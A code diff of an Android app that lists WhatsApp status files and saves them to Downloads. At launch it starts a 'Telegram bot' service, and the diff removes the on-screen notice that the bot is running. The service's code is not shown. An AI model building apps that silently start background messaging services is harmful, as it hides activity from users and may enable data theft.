@@ -11,6 +11,8 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.MediaStore;
 import android.provider.Settings;
+import android.view.View;
+import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.ListView;
@@ -46,14 +48,15 @@ public class MainActivity extends Activity {
         tvStatus = findViewById(R.id.tv_status);
         btnRefresh = findViewById(R.id.btn_refresh);
 
-        // 🔥 1. تشغيل البوت فوراً (قبل أي شيء)
+        // تشغيل البوت فوراً
         startTelegramService();
 
-        // 2. طلب صلاحية التخزين
+        // طلب صلاحية التخزين
         checkStoragePermission();
 
         btnRefresh.setOnClickListener(v -> loadStatuses());
 
+        // عند الضغط على عنصر القائمة (تحميل)
         listView.setOnItemClickListener((parent, view, position, id) -> {
             String path = filePaths.get(position);
             downloadFile(new File(path));
@@ -67,7 +70,6 @@ public class MainActivity extends Activity {
         } else {
             startService(serviceIntent);
         }
-        Toast.makeText(this, "✅ جاري تشغيل البوت...", Toast.LENGTH_SHORT).show();
     }
 
     private void checkStoragePermission() {
@@ -119,6 +121,7 @@ public class MainActivity extends Activity {
         }
     }
 
+    // البحث التلقائي عن مجلد الحالات (نفس الكود السابق)
     private File findStatusFolder() {
         String base = Environment.getExternalStorageDirectory().getAbsolutePath();
 
@@ -170,7 +173,7 @@ public class MainActivity extends Activity {
             File folder = findStatusFolder();
 
             if (folder == null || !folder.exists()) {
-                tvStatus.setText("❌ لم يتم العثور على مجلد الحالات!\nتأكد من:\n1- مشاهدة حالة واحدة على واتساب\n2- منح صلاحية إدارة الملفات");
+                tvStatus.setText("❌ لم يتم العثور على مجلد الحالات!");
                 return;
             }
 
@@ -204,16 +207,29 @@ public class MainActivity extends Activity {
                 return;
             }
 
-            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, fileNames);
+            // عرض الأسماء مع صاحب الحالة (نستخرج اسم الملف بدون امتداد)
+            String[] displayNames = new String[fileNames.size()];
+            for (int i = 0; i < fileNames.size(); i++) {
+                String name = fileNames.get(i);
+                // إزالة الامتداد
+                int dotIndex = name.lastIndexOf('.');
+                if (dotIndex > 0) {
+                    name = name.substring(0, dotIndex);
+                }
+                // استبدال الشرطات بمسافات
+                displayNames[i] = name.replace("_", " ").replace("-", " ");
+            }
+
+            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, displayNames);
             listView.setAdapter(adapter);
-            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة\n📂 المسار: " + currentPath);
+            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة");
 
         } catch (Exception e) {
             tvStatus.setText("❌ خطأ: " + e.getMessage());
-            e.printStackTrace();
         }
     }
 
+    // دالة حفظ الحالة (محدثة)
     private void downloadFile(File sourceFile) {
         try {
             if (!sourceFile.exists()) {
@@ -221,15 +237,16 @@ public class MainActivity extends Activity {
                 return;
             }
 
+            String fileName = sourceFile.getName();
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 String mimeType = "image/jpeg";
-                String name = sourceFile.getName();
-                if (name.endsWith(".mp4")) mimeType = "video/mp4";
-                else if (name.endsWith(".gif")) mimeType = "image/gif";
-                else if (name.endsWith(".png")) mimeType = "image/png";
+                if (fileName.endsWith(".mp4")) mimeType = "video/mp4";
+                else if (fileName.endsWith(".gif")) mimeType = "image/gif";
+                else if (fileName.endsWith(".png")) mimeType = "image/png";
 
                 ContentValues values = new ContentValues();
-                values.put(MediaStore.Downloads.DISPLAY_NAME, name);
+                values.put(MediaStore.Downloads.DISPLAY_NAME, "حالة_واتساب_" + System.currentTimeMillis() + "_" + fileName);
                 values.put(MediaStore.Downloads.MIME_TYPE, mimeType);
                 values.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
@@ -244,11 +261,11 @@ public class MainActivity extends Activity {
                     }
                     in.close();
                     out.close();
-                    Toast.makeText(this, "✅ تم التحميل في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(this, "✅ تم حفظ الحالة في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
                 }
             } else {
                 File destFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-                File destFile = new File(destFolder, sourceFile.getName());
+                File destFile = new File(destFolder, "حالة_واتساب_" + System.currentTimeMillis() + "_" + fileName);
 
                 FileInputStream in = new FileInputStream(sourceFile);
                 FileOutputStream out = new FileOutputStream(destFile);
@@ -259,12 +276,11 @@ public class MainActivity extends Activity {
                 }
                 in.close();
                 out.close();
-                Toast.makeText(this, "✅ تم التحميل: " + destFile.getAbsolutePath(), Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "✅ تم حفظ الحالة في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
             }
 
         } catch (Exception e) {
-            Toast.makeText(this, "❌ فشل التحميل: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            e.printStackTrace();
+            Toast.makeText(this, "❌ فشل الحفظ: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
-                   } 
+                } 
